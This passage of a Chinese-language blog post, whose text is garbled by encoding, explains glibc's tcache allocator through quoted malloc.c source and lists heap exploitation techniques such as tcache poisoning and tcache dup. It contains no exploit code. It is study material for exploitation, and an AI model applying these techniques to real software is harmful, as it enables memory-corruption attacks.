class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//æŒ‡å‘çš„user-dateéƒ¨åˆ†å—·</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">static</span> __thread <span class="hljs-keyword">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></div></td></tr></table></figure><p>æ¯ä¸ª thread éƒ½ä¼šç»´æŠ¤ä¸€ä¸ª <code>tcache_perthread_struct</code>ï¼Œå®ƒæ˜¯æ•´ä¸ª tcache çš„ç®¡ç†ç»“æ„ï¼Œä¸€å…±æœ‰ <code>TCACHE_MAX_BINS</code> ä¸ªè®¡æ•°å™¨å’Œ <code>TCACHE_MAX_BINS</code>é¡¹ tcache_entryï¼Œå…¶ä¸­</p><ul><li><code>tcache_entry</code> ç”¨å•å‘é“¾è¡¨çš„æ–¹å¼é“¾æ¥äº†ç›¸åŒå¤§å°çš„å¤„äºç©ºé—²çŠ¶æ€ï¼ˆfree åï¼‰çš„ chunkï¼Œè¿™ä¸€ç‚¹ä¸Šå’Œ fastbin å¾ˆåƒã€‚</li><li><code>counts</code> è®°å½•äº† <code>tcache_entry</code> é“¾ä¸Šç©ºé—² chunk çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkã€‚</li></ul><p><strong><mark>æ³¨æ„!!</mark></strong> </p><ul><li>2.29å¼€å§‹tcache_entryçš„ç»“æ„å‘ç”Ÿæ”¹å˜:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></div></td></tr></table></figure><ul><li>tcacheçš„chunkç®¡ç†æ˜¯é€šè¿‡memæŒ‡é’ˆæ“ä½œçš„, æ‰€ä»¥æœ‰ä¸ªchunk2mem()å‡½æ•°åœ¨å¼€å¤´.</li></ul><h2 id="åŸºæœ¬å®å®šä¹‰"><a href="#åŸºæœ¬å®å®šä¹‰" class="headerlink" title="åŸºæœ¬å®å®šä¹‰"></a>åŸºæœ¬å®å®šä¹‰</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_FILL_COUNT 7</span><br></code></pre></div></td></tr></table></figure><ul><li>Tcacheä¸ºæ¯ä¸ªçº¿ç¨‹éƒ½é¢„ç•™äº†è¿™æ ·ä¸€ä¸ªç‰¹æ®Šçš„binsï¼Œ binçš„æ•°é‡æ˜¯64ä¸ª æ¯ä¸ªbinä¸­æœ€å¤šç¼“å­˜7ä¸ªchunkã€‚åœ¨64ä½ç³»ç»Ÿä¸Šä»¥0x10çš„å­—èŠ‚é€’å¢ï¼Œ<strong>ä»24é€’å¢åˆ°1032å­—èŠ‚</strong>ã€‚32ä½ç³»ç»Ÿä¸Šåˆ™<strong>ä»12åˆ°512å­—èŠ‚</strong>ï¼Œæ‰€ä»¥Tcacheç¼“å­˜çš„æ˜¯<strong>éLarge Chunkçš„chunk</strong> </li></ul><h2 id="å·¥ä½œæ–¹å¼"><a href="#å·¥ä½œæ–¹å¼" class="headerlink" title="å·¥ä½œæ–¹å¼"></a>å·¥ä½œæ–¹å¼</h2><ul><li>ç¬¬ä¸€æ¬¡ malloc æ—¶ï¼Œä¼šå…ˆ malloc ä¸€å—å†…å­˜ç”¨æ¥å­˜æ”¾ <code>tcache_perthread_struct</code> ã€‚</li><li>free å†…å­˜ï¼Œä¸” size å°äº small bin size æ—¶</li><li>tcache ä¹‹å‰ä¼šæ”¾åˆ° fastbin æˆ–è€… unsorted bin ä¸­ </li><li>tcache åï¼š<ul><li>å…ˆæ”¾åˆ°å¯¹åº”çš„ tcache ä¸­ï¼Œç›´åˆ° tcache è¢«å¡«æ»¡ï¼ˆé»˜è®¤æ˜¯ 7 ä¸ªï¼‰</li><li>tcache è¢«å¡«æ»¡ä¹‹åï¼Œå†æ¬¡ free çš„å†…å­˜å’Œä¹‹å‰ä¸€æ ·è¢«æ”¾åˆ° fastbin æˆ–è€… unsorted bin ä¸­</li><li>tcache ä¸­çš„ chunk ä¸ä¼šåˆå¹¶ï¼ˆä¸å–æ¶ˆ inuse bitï¼‰</li></ul></li><li>malloc å†…å­˜ï¼Œä¸” size åœ¨ tcache èŒƒå›´å†…</li><li>å…ˆä» tcache å– chunkï¼Œç›´åˆ° tcache ä¸ºç©º </li><li>tcache ä¸ºç©ºåï¼Œä» bin ä¸­æ‰¾</li><li>tcache ä¸ºç©ºæ—¶ï¼Œå¦‚æœ <code>fastbin/smallbin/unsorted bin</code> ä¸­æœ‰ size ç¬¦åˆçš„ chunkï¼Œä¼šå…ˆæŠŠ <code>fastbin/smallbin/unsorted bin</code> ä¸­çš„ chunk æ”¾åˆ° tcache ä¸­ï¼Œç›´åˆ°å¡«æ»¡ã€‚ä¹‹åå†ä» tcache ä¸­å–ï¼›å› æ­¤ chunk åœ¨ bin ä¸­å’Œ tcache ä¸­çš„é¡ºåºä¼šåè¿‡æ¥</li></ul><h2 id="å„ä¸ªå‡½æ•°ä¸­å…³äºtcacheçš„éƒ¨åˆ†"><a href="#å„ä¸ªå‡½æ•°ä¸­å…³äºtcacheçš„éƒ¨åˆ†" class="headerlink" title="å„ä¸ªå‡½æ•°ä¸­å…³äºtcacheçš„éƒ¨åˆ†"></a>å„ä¸ªå‡½æ•°ä¸­å…³äºtcacheçš„éƒ¨åˆ†</h2><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcache_init(<span class="hljs-keyword">void</span>)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>    <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br>    <br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">// æ‰¾åˆ°å¯ç”¨çš„ arena</span><br>  victim = _int_malloc (ar_ptr, bytes); <span class="hljs-comment">// ç”³è¯·ä¸€ä¸ª sizeof(tcache_perthread_struct) å¤§å°çš„ chunk</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//è¿™æ˜¯.....ä¸æˆåŠŸå†æ¥ä¸€é?????</span><br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>    <br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>    <span class="hljs-comment">//æ³¨é‡Šè¯´å¦‚æœå–ä¸åˆ°çš„è¯å°±ç­‰ä¼šå†è¯•, é€šå¸¸åœ¨å†…å­˜ç©ºé—´å°çš„æƒ…å†µä¸‹</span><br>  <span class="hljs-keyword">if</span> (victim) <span class="hljs-comment">// åˆå§‹åŒ– tcache</span><br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br></code></pre></div></td></tr></table></figure><h3 id="â€“libc-malloc-1"><a href="#â€“libc-malloc-1" class="headerlink" title="â€“libc-malloc  "></a><a href="#__libc_malloc">â€“libc-malloc</a> <span id="libcmalloc"> </span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> *<br>__libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>    ......<br>    ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes;<br>  <span class="hljs-comment">// æ ¹æ® malloc ä¼ å…¥çš„å‚æ•°è®¡ç®— chunk å®é™…å¤§å°ï¼Œå¹¶è®¡ç®— tcache å¯¹åº”çš„ä¸‹æ ‡</span><br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  <span class="hljs-comment">// åˆå§‹åŒ– tcache</span><br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//å¦‚æœä¸ºç©ºå°±æ‰§è¡Œåˆå§‹åŒ–å‡½æ•°</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="hljs-comment">// æ ¹æ® size å¾—åˆ°çš„ idx åœ¨åˆæ³•çš„èŒƒå›´å†…</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// tcache-&gt;entries[tc_idx] æœ‰ chunk</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    ......<br>    ......<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="int-malloc-2-36"><a href="#int-malloc-2-36" class="headerlink" title="_int_malloc 2.36"></a>_int_malloc <u>2.36</u></h3><p>ï¼ˆ1ï¼‰é¦–å…ˆï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ fastbin å¤§å°æ—¶å¹¶ä¸”åœ¨ fastbin å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥ fastbin é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥ tcache ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment"> stash them in the tcache.  */</span><br>      <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  mchunkptr tc_victim;<br><br>  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br> &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = REVEAL_PTR (tc_victim-&gt;fd);<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  REMOVE_FB (fb, pp, tc_victim);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>ï¼ˆ2ï¼‰å…¶æ¬¡ï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ smallbin å¤§å°æ—¶å¹¶ä¸”åœ¨ smallbin å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥ smallbin é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥ tcache ä¸­ã€‚<a href="https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3914">source</a> </p><p>ï¼ˆ3ï¼‰å½“åœ¨ unsorted bin é“¾ä¸Šå¾ªç¯å¤„ç†æ—¶ï¼Œå½“æ‰¾åˆ°å¤§å°ä¸€è‡´çš„chunkæ—¶ï¼Œå¹¶ä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯å…ˆæ”¾åˆ° tcache ä¸­ï¼Œç»§ç»­å¤„ç†ã€‚<a href="https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L4052">source</a> </p><p>   (4)  unsorted binå¤§å¾ªç¯é‡Œå¦‚æœè¾¾åˆ°æ”¾å…¥tcacheå—è¾¾åˆ°æœ€å¤§æ•°é‡ï¼Œä¼šç«‹å³è¿”å›ã€‚é»˜è®¤æ˜¯ 0ï¼Œå³ä¸å­˜åœ¨ä¸Šé™ã€‚</p><p>   (5)  åœ¨å¾ªç¯å¤„ç† unsorted bin å†…å­˜å—åï¼Œå¦‚æœä¹‹å‰æ›¾æ”¾å…¥è¿‡ tcache å—ï¼Œåˆ™ä¼šå–å‡ºä¸€ä¸ªå¹¶è¿”å›ã€‚é€šè¿‡<code>return_cached</code>å˜é‡. </p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>çœ‹ä¸€ä¸‹ <code>tcache_get()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">// è·å¾—ä¸€ä¸ª chunkï¼Œcounts å‡ä¸€</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br><br><span class="hljs-comment">//2.31</span><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_get()</code> å°±æ˜¯è·å¾— chunk çš„è¿‡ç¨‹äº†ã€‚å¯ä»¥çœ‹å‡ºè¿™ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä» <code>tcache-&gt;entries[tc_idx]</code> ä¸­è·å¾—ç¬¬ä¸€ä¸ª chunkï¼Œ<code>tcache-&gt;counts</code> å‡ä¸€ï¼Œå‡ ä¹æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</li><li>å°‘æ‰çš„ä¸¤ä¸ªassertåœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰å·²ç»æ£€æŸ¥è¿‡, å†™äº†ä¸ªappease gcc, å°±å½“æ˜¯ä¸å­˜åœ¨å§.</li></ul><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><p>çœ‹å®Œç”³è¯·ï¼Œå†çœ‹çœ‹æœ‰ tcache æ—¶çš„é‡Šæ”¾</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>__libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  ......<br>  ......<br>  MAYBE_INIT_TCACHE ();<br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>__libc_free()</code> æ²¡æœ‰å¤ªå¤šå˜åŒ–ï¼Œ<code>MAYBE_INIT_TCACHE ()</code> åœ¨ tcache ä¸ä¸ºç©ºå¤±å»äº†ä½œç”¨ã€‚</li></ul><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free()"></a>_int_free()</h3><p>è·Ÿè¿› <code>_int_free()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  ......<br>  ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 64</span><br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="hljs-comment">// 7</span><br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  ......<br>  ......<br></code></pre></div></td></tr></table></figure><ul><li>åˆ¤æ–­ <code>tc_idx</code> åˆæ³•ï¼Œ<code>tcache-&gt;counts[tc_idx]</code> åœ¨ 7 ä¸ªä»¥å†…æ—¶ï¼Œå°±è¿›å…¥ <code>tcache_put()</code>ï¼Œä¼ é€’çš„ä¸¤ä¸ªå‚æ•°æ˜¯è¦é‡Šæ”¾çš„ chunk å’Œè¯¥ chunk å¯¹åº”çš„ size åœ¨ tcache ä¸­çš„ä¸‹æ ‡ã€‚</li></ul><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_puts()</code> å®Œæˆäº†æŠŠé‡Šæ”¾çš„ chunk æ’å…¥åˆ° <code>tcache-&gt;entries[tc_idx]</code> é“¾è¡¨å¤´éƒ¨çš„æ“ä½œï¼Œä¹Ÿå‡ ä¹æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚å¹¶ä¸” <strong>æ²¡æœ‰æŠŠ p ä½ç½®é›¶</strong>ã€‚</li></ul><h2 id="åˆ©ç”¨ä¹‹å¤„"><a href="#åˆ©ç”¨ä¹‹å¤„" class="headerlink" title="åˆ©ç”¨ä¹‹å¤„"></a>åˆ©ç”¨ä¹‹å¤„</h2><ul><li>tcache poisoning: å°±æ˜¯ç®€å•çš„ä¿®æ”¹nextæŒ‡é’ˆ.</li><li>tcache dup: å¤šæ¬¡é‡Šæ”¾</li><li>smallbin unlink: åœ¨smallbinä¸­éå†æ‰¾åˆ°chunkæ—¶ä¹Ÿä¼šå°†å…¶ä»–ç›¸åŒå¤§å°çš„chunkæ”¾åˆ°tcache, ç„¶è€Œç¼ºå°‘æ£€æŸ¥. ä¸ç†Ÿæ‚‰</li><li>tcache stashing unlink attack: ä¸ç†Ÿæ‚‰</li></ul><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ç®€å•çš„è¯´ï¼ŒUse After Free 